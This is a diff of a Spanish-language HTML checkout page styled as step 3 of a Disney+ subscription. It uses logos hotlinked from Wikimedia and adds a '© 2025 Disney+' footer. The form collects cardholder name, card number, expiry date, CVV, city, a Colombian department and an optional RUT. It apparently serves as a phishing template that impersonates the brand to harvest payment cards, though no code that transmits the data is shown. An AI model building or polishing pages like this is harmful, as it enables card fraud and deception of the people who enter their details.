@@ -3,68 +3,81 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Paso 3 de 3 | ¡A disfrutar!</title>
+<title>Paso 3 | Disney+</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
 body {
     margin: 0;
+    background: #0f0f0f;
     font-family: 'Inter', sans-serif;
-    background: #0d0d0f;
     color: #fff;
 }
 
 /* HEADER */
-.header {
+header {
+    padding: 20px;
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 22px;
 }
 
-.header img {
-    width: 110px;
+header img {
+    height: 34px;
 }
 
-.header a {
-    color: #ffffff;
+header a {
+    color: #bbb;
     font-size: 15px;
     text-decoration: none;
 }
 
-/* CONTENIDO */
-.container {
+/* CONTENEDOR PRINCIPAL */
+.main-container {
     padding: 20px;
-    max-width: 650px;
+    max-width: 600px;
     margin: auto;
 }
 
 .step {
-    color: #bbbbbb;
-    font-size: 15px;
+    font-size: 14px;
+    color: #9ca3af;
 }
 
 h1 {
-    font-size: 32px;
+    font-size: 28px;
     margin-top: 5px;
     margin-bottom: 25px;
 }
 
-/* TITULO SECCIÓN */
-.tab-title {
-    font-size: 20px;
-    font-weight: 600;
-    margin-bottom: 25px;
-    color: #00b3ff;
+/* TABS DE MÉTODO DE PAGO */
+.tabs {
+    display: flex;
+    margin-bottom: 20px;
+    border-bottom: 1px solid #333;
 }
 
-/* LABEL */
+.tab {
+    flex: 1;
+    text-align: center;
+    padding: 12px 0;
+    font-size: 16px;
+    cursor: pointer;
+    color: #bbb;
+}
+
+.tab.active {
+    color: #00c8ff;
+    border-bottom: 2px solid #00c8ff;
+}
+
+/* LABELS */
 label {
-    font-size: 13px;
-    color: #cccccc;
     display: block;
-    margin-bottom: 6px;
+    margin: 18px 0 6px;
+    font-size: 14px;
+    color: #d1d5db;
 }
 
 /* INPUTS */
@@ -75,62 +88,61 @@ input, select {
     border: 1px solid #383838;
     border-radius: 6px;
     color: #fff;
-    margin-bottom: 18px;
     font-size: 15px;
+    box-sizing: border-box;
 }
 
-/* FILA MM/AA Y CVV */
-.row {
-    display: flex;
-    gap: 15px;
-}
-
-.row div {
-    width: 100%;
-}
-
-/* ICONOS TARJETAS */
-.cards {
-    position: absolute;
-    top: 44px;
-    right: 10px;
-}
-
-.cards img {
-    width: 42px;
-    margin-left: 8px;
-}
-
-/* INPUT CON ICONO */
-.input-icon {
+/* INPUT ESPECIAL PARA TARJETA */
+.input-card {
     position: relative;
 }
 
-.input-icon i {
+.card-icons {
     position: absolute;
     right: 12px;
-    top: 44px;
-    font-size: 18px;
-    opacity: 0.6;
-    cursor: pointer;
+    top: 50%;
+    transform: translateY(-50%);
+    display: flex;
+    gap: 6px;
+}
+
+.card-icons img {
+    height: 26px;
+    opacity: .9;
 }
 
 /* BOTÓN FINAL */
 button {
     width: 100%;
-    padding: 18px;
+    padding: 16px;
+    margin-top: 25px;
     background: #fff;
     border: none;
-    border-radius: 10px;
-    font-size: 17px;
-    font-weight: 600;
     color: #000;
+    border-radius: 30px;
+    font-size: 17px;
     cursor: pointer;
-    margin-top: 10px;
+    font-weight: 600;
 }
 
-button:hover {
-    background: #dddddd;
+/* FOOTER */
+footer {
+    margin-top: 50px;
+    padding: 35px 20px;
+    background: #0d0d0d;
+    color: #7e7e7e;
+    text-align: center;
+    font-size: 13px;
+}
+
+footer .footer-top {
+    margin-bottom: 15px;
+}
+
+footer a {
+    color: #00c8ff;
+    text-decoration: none;
+    font-size: 13px;
 }
 </style>
 </head>
@@ -138,68 +150,76 @@ button:hover {
 <body>
 
 <!-- HEADER -->
-<div class="header">
+<header>
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
     <a href="#">Cerrar sesión</a>
-</div>
+</header>
 
 <!-- CONTENIDO PRINCIPAL -->
-<div class="container">
+<div class="main-container">
 
     <div class="step">PASO 3 DE 3</div>
     <h1>¡A disfrutar!</h1>
 
-    <div class="tab-title">💳 Crédito/Débito</div>
+    <!-- TAB SOLO TARJETA -->
+    <div class="tabs">
+        <div class="tab active">Crédito/Débito</div>
+    </div>
 
     <!-- FORMULARIO -->
-
     <label>NOMBRE EN LA TARJETA</label>
-    <input type="text" placeholder="Nombre completo">
+    <input type="text" placeholder="Nombre del titular">
 
     <label>NÚMERO DE LA TARJETA</label>
-    <div class="input-icon">
-        <input type="text" placeholder="•••• •••• •••• ••••">
-        <div class="cards">
+    <div class="input-card">
+        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
+        <div class="card-icons">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
             <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
         </div>
     </div>
 
-    <div class="row">
-        <div>
+    <div style="display:flex; gap:15px; margin-top:15px;">
+        <div style="flex:1;">
             <label>FECHA DE VENCIMIENTO</label>
-            <input type="text" placeholder="MM/AA">
+            <input type="text" placeholder="MM/AA" maxlength="5">
         </div>
 
-        <div>
+        <div style="flex:1;">
             <label>CÓDIGO DE SEGURIDAD</label>
-            <div class="input-icon">
-                <input type="text" placeholder="CVV">
-                <i>🛈</i>
-            </div>
+            <input type="text" placeholder="CVV" maxlength="4">
         </div>
     </div>
 
     <label>CIUDAD</label>
-    <input type="text" placeholder="Ciudad">
+    <input type="text" placeholder="Ingrese su ciudad">
 
     <label>DEPARTAMENTO</label>
     <select>
-        <option>Seleccionar...</option>
+        <option>Seleccionar…</option>
         <option>Antioquia</option>
+        <option>Cundinamarca</option>
         <option>Valle del Cauca</option>
         <option>Atlántico</option>
-        <option>Bolívar</option>
-        <option>Cundinamarca</option>
+        <option>Santander</option>
     </select>
 
     <label>RUT (OPCIONAL)</label>
-    <input type="text" placeholder="Número de RUT">
+    <input type="text" placeholder="Opcional">
 
-    <button>Confirmar y suscribirme</button>
-
+    <button>INICIAR SUSCRIPCIÓN</button>
 </div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-top">
+        © 2025 Disney+. Todos los derechos reservados.
+    </div>
+    <a href="#">Términos de uso</a> · 
+    <a href="#">Política de privacidad</a> · 
+    <a href="#">Ayuda</a>
+</footer>
 
 </body>
 </html>
